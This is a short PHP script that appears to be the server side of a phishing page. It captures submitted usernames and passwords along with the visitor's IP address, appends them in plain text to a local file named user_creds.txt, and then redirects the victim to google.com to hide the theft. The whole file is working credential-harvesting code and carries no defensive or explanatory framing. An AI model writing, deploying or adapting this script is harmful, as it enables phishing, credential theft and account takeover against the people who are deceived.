<?php
    if($_SERVER["REQUEST_METHOD"] == "POST"){
        $username = isset($_POST["username"]) ? $_POST["username"] : "";
        $password = isset($_POST["password"]) ? $_POST["password"] : "";

        $username = trim(htmlspecialchars($username));
        $password = trim(htmlspecialchars($password));

        //get the ip
        if(isset($_SERVER['HTTP_CLIENT_IP']))
        {
            $ipaddr = $_SERVER['HTTP_CLIENT_IP'];
        }
        elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        {
            $ipaddr = $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
        else
        {
            $ipaddr = $_SERVER['REMOTE_ADDR'];
        }
    
        // Handle multiple IP addresses (if present in the header)
        if(strpos($ipaddr, ',') !== false)
        {
            $ipaddr = preg_split("/\,/", $ipaddr)[0];
        }

        $userCreds = "Username: $username\nPassword: $password\nIP Adress: $ipaddr\n\n";

        file_put_contents("user_creds.txt", $userCreds, FILE_APPEND);

        header('Location: https://www.google.com');
        exit;
    }
?>
